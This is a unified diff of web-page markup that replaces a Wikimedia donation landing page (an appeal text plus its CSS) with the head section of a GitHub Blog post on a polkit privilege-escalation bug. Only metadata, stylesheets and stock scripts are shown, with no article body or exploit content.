@@ -1,1451 +1,615 @@
-<!DOCTYPE html>
-<html class="client-nojs" lang="en" dir="ltr">
+<!doctype html>
+<html lang="en-US">
 <head>
-<meta charset="UTF-8"/>
-<title>Make your donation now - Wikimedia Foundation</title>
-<script>document.documentElement.className="client-js";RLCONF={"wgBreakFrames":true,"wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgRequestId":"232ea912-de77-4ab2-a168-d98f243a711a","wgCSPNonce":false,"wgCanonicalNamespace":"Special","wgCanonicalSpecialPageName":"FundraiserLandingPage","wgNamespaceNumber":-1,"wgPageName":"Special:LandingPage","wgTitle":"LandingPage","wgCurRevisionId":0,"wgRevisionId":0,"wgArticleId":0,"wgIsArticle":false,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":[],"wgPageContentLanguage":"en","wgPageContentModel":"wikitext","wgRelevantPageName":"Special:LandingPage","wgRelevantArticleId":0,"wgIsProbablyEditable":false,"wgRelevantPageIsProbablyEditable":false,"wgVisualEditor":{"pageLanguageCode":"en","pageLanguageDir":"ltr","pageVariantFallbacks":
-"en"},"wgMFDisplayWikibaseDescriptions":{"search":true,"nearby":true,"watchlist":true,"tagline":false},"wgMediaViewerOnClick":true,"wgMediaViewerEnabledByDefault":true,"wgULSCurrentAutonym":"English","wgEditSubmitButtonLabelPublish":true,"wgULSPosition":"personal","wgULSisCompactLinksEnabled":true};RLSTATE={"site.styles":"ready","user.styles":"ready","user":"ready","user.options":"loading","skins.vector.styles.legacy":"ready","ext.visualEditor.desktopArticleTarget.noscript":"ready","ext.uls.pt":"ready"};RLPAGEMODULES=["site","mediawiki.page.ready","skins.vector.legacy.js","ext.fundraiserLandingPage.LogPageview","ext.visualEditor.desktopArticleTarget.init","ext.visualEditor.targetLoader","ext.eventLogging","ext.uls.compactlinks","ext.uls.interface"];</script>
-<script>(RLQ=window.RLQ||[]).push(function(){mw.loader.implement("user.options@1i9g4",function($,jQuery,require,module){mw.user.tokens.set({"patrolToken":"+\\","watchToken":"+\\","csrfToken":"+\\"});});});</script>
-<link rel="stylesheet" href="/w/load.php?lang=en&amp;modules=ext.uls.pt%7Cext.visualEditor.desktopArticleTarget.noscript%7Cskins.vector.styles.legacy&amp;only=styles&amp;skin=vector"/>
-<script async="" src="/w/load.php?lang=en&amp;modules=startup&amp;only=scripts&amp;raw=1&amp;skin=vector"></script>
-<meta name="ResourceLoaderDynamicStyles" content=""/>
-<link rel="stylesheet" href="/w/load.php?lang=en&amp;modules=site.styles&amp;only=styles&amp;skin=vector"/>
-<meta name="generator" content="MediaWiki 1.39.0-wmf.10"/>
-<meta name="referrer" content="origin"/>
-<meta name="referrer" content="origin-when-crossorigin"/>
-<meta name="referrer" content="origin-when-cross-origin"/>
-<meta name="robots" content="noindex,nofollow"/>
-<meta name="format-detection" content="telephone=no"/>
-<meta property="og:title" content="Make your donation now - Wikimedia Foundation"/>
-<meta property="og:type" content="website"/>
-<link rel="alternate" media="only screen and (max-width: 720px)" href="//donate.m.wikimedia.org/wiki/Special:LandingPage"/>
-<link rel="shortcut icon" href="/static/favicon/wmf.ico"/>
-<link rel="search" type="application/opensearchdescription+xml" href="/w/opensearch_desc.php" title="Donate (en)"/>
-<link rel="EditURI" type="application/rsd+xml" href="//donate.wikimedia.org/w/api.php?action=rsd"/>
-<link rel="license" href="https://creativecommons.org/licenses/by-sa/3.0/"/>
-<link rel="canonical" href="https://donate.wikimedia.org/w/index.php?title=Special:LandingPage&amp;country=XX&amp;uselang=en&amp;utm_medium=wmfSite&amp;utm_source=101&amp;utm_campaign=navButton"/>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+	<link rel="icon" type="image/x-icon" href="https://github.githubassets.com/favicon.ico">
+	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO Premium plugin v17.0 (Yoast SEO v17.0) - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug | The GitHub Blog</title>
+	<link rel="canonical" href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug | The GitHub Blog" />
+	<meta property="og:description" content="polkit is a system service installed by default on many Linux distributions. It’s used by systemd, so any Linux distribution that uses systemd also uses polkit." />
+	<meta property="og:url" content="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/" />
+	<meta property="og:site_name" content="The GitHub Blog" />
+	<meta property="article:publisher" content="https://www.facebook.com/GitHub" />
+	<meta property="article:published_time" content="2021-06-10T16:00:52+00:00" />
+	<meta property="article:modified_time" content="2022-01-26T00:34:14+00:00" />
+	<meta property="og:image" content="https://github.blog/wp-content/uploads/2021/06/polkit-diagram-for-social.png" />
+	<meta property="og:image:width" content="1200" />
+	<meta property="og:image:height" content="630" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:image" content="https://github.blog/wp-content/uploads/2021/06/polkit-diagram-for-social.png?fit=1200%2C630" />
+	<meta name="twitter:creator" content="@github" />
+	<meta name="twitter:site" content="@github" />
+	<meta name="twitter:label1" content="Written by" />
+	<meta name="twitter:data1" content="Kevin Backhouse" />
+	<meta name="twitter:label2" content="Est. reading time" />
+	<meta name="twitter:data2" content="15 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://github.blog/#organization","name":"GitHub","url":"https://github.blog/","sameAs":["https://www.facebook.com/GitHub","https://www.instagram.com/github/","https://www.linkedin.com/company/github/","https://www.youtube.com/GitHub","https://en.wikipedia.org/wiki/GitHub","https://twitter.com/github"],"logo":{"@type":"ImageObject","@id":"https://github.blog/#logo","inLanguage":"en-US","url":"https://github.blog/wp-content/uploads/2019/01/cropped-github-favicon-512.png?fit=512%2C512","contentUrl":"https://github.blog/wp-content/uploads/2019/01/cropped-github-favicon-512.png?fit=512%2C512","width":512,"height":512,"caption":"GitHub"},"image":{"@id":"https://github.blog/#logo"}},{"@type":"WebSite","@id":"https://github.blog/#website","url":"https://github.blog/","name":"The GitHub Blog","description":"Updates, ideas, and inspiration from GitHub to help developers build and design software.","publisher":{"@id":"https://github.blog/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://github.blog/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#primaryimage","inLanguage":"en-US","url":"https://github.blog/wp-content/uploads/2021/06/polkit-diagram-for-social.png?fit=1200%2C630","contentUrl":"https://github.blog/wp-content/uploads/2021/06/polkit-diagram-for-social.png?fit=1200%2C630","width":1200,"height":630},{"@type":"WebPage","@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#webpage","url":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/","name":"Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug | The GitHub Blog","isPartOf":{"@id":"https://github.blog/#website"},"primaryImageOfPage":{"@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#primaryimage"},"datePublished":"2021-06-10T16:00:52+00:00","dateModified":"2022-01-26T00:34:14+00:00","breadcrumb":{"@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/"]}]},{"@type":"BreadcrumbList","@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://github.blog/"},{"@type":"ListItem","position":2,"name":"Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug"}]},{"@type":"Article","@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#article","isPartOf":{"@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#webpage"},"author":{"@id":"https://github.blog/#/schema/person/92f78909ac8106949ccaf6878d3d33d8"},"headline":"Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug","datePublished":"2021-06-10T16:00:52+00:00","dateModified":"2022-01-26T00:34:14+00:00","mainEntityOfPage":{"@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#webpage"},"wordCount":2308,"publisher":{"@id":"https://github.blog/#organization"},"image":{"@id":"https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#primaryimage"},"thumbnailUrl":"https://github.blog/wp-content/uploads/2019/09/security-1200-630.png?fit=1200%2C630","keywords":["GitHub Security Lab"],"articleSection":["Security"],"inLanguage":"en-US"},{"@type":"Person","@id":"https://github.blog/#/schema/person/92f78909ac8106949ccaf6878d3d33d8","name":"Kevin Backhouse","image":{"@type":"ImageObject","@id":"https://github.blog/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/ec4b8afb92d138ba6471f366184c3386?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/ec4b8afb92d138ba6471f366184c3386?s=96&d=mm&r=g","caption":"Kevin Backhouse"},"description":"I'm a security researcher on the GitHub Security Lab team. I try to help make open source software more secure by searching for vulnerabilities and working with maintainers to get them fixed.","url":"https://github.blog/author/kevinbackhouse/"}]}</script>
+	<!-- / Yoast SEO Premium plugin. -->
+
+
+<link rel='dns-prefetch' href='//cdn.parsely.com' />
+<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel='dns-prefetch' href='//v0.wordpress.com' />
+<link rel="alternate" type="application/rss+xml" title="The GitHub Blog &raquo; Feed" href="https://github.blog/feed/" />
+<link rel="alternate" type="application/rss+xml" title="The GitHub Blog &raquo; Comments Feed" href="https://github.blog/comments/feed/" />
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/github.blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.9.3"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+</script>
+<style>
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='all-css-0' href='https://github.blog/_static/??-eJyNy0EOQDAQheELqVFCYiHOUu1EhmlJpyK9PRsJO8s/731w7oqC5cOhgBUBR5Jg4s2uimmKJmaQlBlLT6G8DwW8xSLg0ZFBRo8hfWJnkzEqxtnY/I/f27sfNPpBd23V60bX9QWHdUGf' type='text/css' media='all' />
+<style id='wp-block-library-inline-css'>
+.has-text-align-justify{text-align:justify;}
+</style>
+<style id='global-styles-inline-css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+</style>
+<link rel='stylesheet' id='all-css-2' href='https://github.blog/wp-content/themes/github-2021/assets/css/site.min.css?m=1651170422g' type='text/css' media='all' />
+<link rel='stylesheet' id='highlightjs-css-css'  href='https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/default.min.css?ver=11.4.0' media='all' />
+<link rel='stylesheet' id='all-css-4' href='https://github.blog/wp-content/mu-plugins/jetpack-10.9/css/jetpack.css?m=1651057020g' type='text/css' media='all' />
+<link rel="https://api.w.org/" href="https://github.blog/wp-json/" /><link rel="alternate" type="application/json" href="https://github.blog/wp-json/wp/v2/posts/58581" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://github.blog/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://github.blog/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.9.3" />
+<link rel='shortlink' href='https://wp.me/pamS32-feR' />
+<link rel="alternate" type="application/json+oembed" href="https://github.blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fgithub.blog%2F2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://github.blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fgithub.blog%2F2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug%2F&#038;format=xml" />
+<meta name="parsely-title" content="Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug" />
+<meta name="parsely-link" content="http://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/" />
+<meta name="parsely-type" content="post" />
+<meta name="parsely-image-url" content="https://github.blog/wp-content/uploads/2019/09/security-1200-630.png?resize=150%2C150" />
+<meta name="parsely-pub-date" content="2021-06-10T16:00:52Z" />
+<meta name="parsely-section" content="Security" />
+<meta name="parsely-tags" content="github security lab" />
+<meta name="parsely-author" content="Kevin Backhouse" />
+<style type='text/css'>img#wpstats{display:none}</style>
+	<meta name="ha-url" content="https://collector.githubapp.com/github-blog/collect"><link rel="preload" href="https://github.blog/wp-content/themes/github-2021/assets/fonts/alliance/Alliance-No-1-ExtraBold.woff2" as="font" type="font/woff2" crossorigin="anonymous"><link rel="preload" href="https://github.blog/wp-content/themes/github-2021/assets/fonts/alliance/Alliance-No-1-Bold.woff2" as="font" type="font/woff2" crossorigin="anonymous"><link rel="preload" href="https://github.blog/wp-content/themes/github-2021/assets/fonts/alliance/Alliance-No-1-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous"><link rel="icon" href="https://github.blog/wp-content/uploads/2019/01/cropped-github-favicon-512.png?fit=32%2C32" sizes="32x32" />
+<link rel="icon" href="https://github.blog/wp-content/uploads/2019/01/cropped-github-favicon-512.png?fit=192%2C192" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://github.blog/wp-content/uploads/2019/01/cropped-github-favicon-512.png?fit=180%2C180" />
+<meta name="msapplication-TileImage" content="https://github.blog/wp-content/uploads/2019/01/cropped-github-favicon-512.png?fit=270%2C270" />
 </head>
-<body class="mediawiki ltr sitedir-ltr mw-hide-empty-elt ns--1 ns-special mw-special-FundraiserLandingPage page-Special_LandingPage rootpage-Special_LandingPage skin-vector action-view skin-vector-legacy"><div id="mw-page-base" class="noprint"></div>
-<div id="mw-head-base" class="noprint"></div>
-<div id="content" class="mw-body" role="main">
-	<a id="top"></a>
-	<div id="siteNotice"></div>
-	<div class="mw-indicators">
-	</div>
-	<h1 id="firstHeading" class="firstHeading mw-first-heading">Make your donation now</h1>
-	<div id="bodyContent" class="vector-body">
-		
-		<div id="contentSub"></div>
-		<div id="contentSub2"></div>
-		
-		<div id="jump-to-nav"></div>
-		<a class="mw-jump-link" href="#mw-head">Jump to navigation</a>
-		<a class="mw-jump-link" href="#searchInput">Jump to search</a>
-		<div id="mw-content-text" class="mw-body-content"><p><meta name="viewport" content="width=device-width, initial-scale=1" />
-</p>
-<div class="mw-parser-output">
-<p><meta name="viewport" content="width=device-width, initial-scale=1" />
-</p>
-<div class="mw-parser-output">
-<p class="mw-empty-elt"></p><div style="display: none;" id="description-for-facebook"><a href="/w/index.php?title=Template:2011FR/Appeal-default/title/en&amp;action=edit&amp;redlink=1" class="new" title="Template:2011FR/Appeal-default/title/en (page does not exist)">Template:2011FR/Appeal-default/title/en</a></div>
-<link rel="image_src" href="//upload.wikimedia.org/wikipedia/donate/e/eb/Wikipedia-logo-Donate2.png" />
-<p class="mw-empty-elt"></p>
-<div id="main-wrapper">
-<div id="appeal-wrapper">
-<div id="appeal">
-<h2><span id="We_ask_you.2C_humbly.2C_to_help."></span><span class="mw-headline" id="We_ask_you,_humbly,_to_help.">We ask you, humbly, to help.</span></h2>
-<p>We'll get straight to the point: Today we ask you to defend Wikipedia's independence. 
-</p><p>We're a non-profit that depends on donations to stay online and thriving, but 98% of our readers don't give; they simply look the other way. If everyone who reads Wikipedia gave just a little, we could keep Wikipedia thriving for years to come. The price of a cup of coffee is all we ask. 
-</p><p>When we made Wikipedia a non-profit, people told us we’d regret it. But if Wikipedia were to become commercial, it would be a great loss to the world.
-</p><p>Wikipedia is a place to learn, not a place for advertising. The heart and soul of Wikipedia is a community of people working to bring you unlimited access to reliable, neutral information.
-</p><p>We know that most people will ignore this message. But if Wikipedia is useful to you, please consider making a donation of <span class="consider-amounts">$5, $20, $50</span> or whatever you can to protect and sustain Wikipedia.
-</p><p>Thanks,
-</p><p><b>Jimmy Wales</b> <br />
-Wikipedia Founder
-</p>
-</div>
-</div>
-<div id="form-wrapper" style="font-size: 1.1em;">
-<p>Sorry, we're having a little trouble detecting what country you're in. Please visit <b><a class="external text" href="https://donate.wikimedia.org/wiki/Special:MyLanguage/Ways_to_Give?utm_medium=donatewiki_nocountry">Ways to Give</a></b> for international payment methods.
-</p>
-</div>
-</div>
-<p> <style>/* === Template:Styles/Default.css === */
 
-*,
-*:before,
-*:after {
-    -moz-box-sizing: border-box;
-    -webkit-box-sizing: border-box;
-    box-sizing: border-box;
-}
-
-/* Hide these until the required JavaScript fiddling has been done */
-#actual-form,
-.consider-amounts {
-    display: none;
-}
-
-#actual-form-loading {
-    text-align: center;
-    line-height: 1.2;
-}
-
-.error-nojs {
-    max-width: 300px;
-    color: #d33;
-}
-
-/* Hide default MediaWiki stuff we don't want */
-
-#mw-page-base, #mw-head-base,
-#mw-panel .portal,
-#mw-head, #catlinks,
-#firstHeading, #contentSub, #siteSub,
-#jump-to-nav, .uls-tipsy {
-    display: none;
-}
-
-/* Re-add gradient background */
-body {
-    background-image: linear-gradient(to bottom, #fff 40px, #f6f6f6 80px);
-    background-position: top;
-    background-repeat: repeat-x;
-    background-color: #f6f6f6;
-}
-
-#content {
-    background-color: transparent;
-    background-image: none;
-    border: 0;
-    padding-top: 32px;
-}
-
-/* Link colors for visibility */
-.mw-parser-output a,
-.mw-parser-output a.external,
-.mw-parser-output a.extiw {
-    color: #36c;
-}
-
-.mw-parser-output a:visited,
-.mw-parser-output a.external:visited,
-.mw-parser-output a.extiw:visited {
-    color: #6f4db3;
-}
-
-.lp-error {
-    color: #d33;
-    font-weight: 500;
-    font-size: 14px;
-}
-
-.amount-options .lp-error {
-    margin: 0 4px;
-}
-
-/* Prevent site logos from showing through modals (e.g. for monthly convert) */
-.vector-body {
-	position: inherit;
-}
-
-body.modal-open {
-	overflow: hidden;
-	position: fixed;
-}
-
-/* --- Overall layout of the landing page --- */
-
-#main-wrapper {
-    width: 100%;
-    display: flex;
-    justify-content: center;
-}
-
-body.rtl #main-wrapper {
-    direction: rtl;
-}
-
-#form-wrapper {
-    width: 380px;
-    background-color: #fff;
-    border: 1px solid #a2a9b1;
-    border-radius: 2px;
-    padding: 24px;
-    color: #222;
-}
-
-#appeal-wrapper {
-    flex: 1;
-    padding-left: 0;
-    padding-right: 28px;
-}
-
-body.rtl #appeal-wrapper {
-    padding-left: 28px;
-    padding-right: 0;
-}
-
-/* --- Appeal --- */
-
-#appeal {
-    font-size: 16px;
-}
-
-#appeal h2,
-#appeal-head {
-    font-size: 21px;
-    padding-bottom: 10px;
-    border-bottom: 1px solid #a2a9b1;
-    margin-bottom: 21px;
-}
-
-.quote-wrapper {
-    padding: 140px 0;
-}
-
-/* --- Hide non-monthly capable payment methods on monthly forms --- */
-
-.form-monthly .not-monthly-capable {
-    display: none;
-}
-
-/* --- Form --- */
-
-#donate-form-wrapper fieldset {
-    width: 100%;
-    border: 0;
-    margin: 0 0 8px 0;
-    padding: 0;
-}
-
-.frequency-options ul,
-.amount-options ul {
-    display: flex;
-    margin: 0;
-    padding: 0;
-    list-style: none;
-}
-
-.frequency-options ul li,
-.amount-options ul li {
-    flex: 1 0 0;
-    padding: 4px;
-}
-
-/* --- Subheaders --- */
-
-#radiobuttons-table-header,
-#paymenttype-table-header {
-    display: block;
-    margin-bottom: 6px;
-    text-align: center;
-    font-weight: bold;
-}
-
-/* --- Commmon button styles --- */
-
-.frequency-options input[type="radio"],
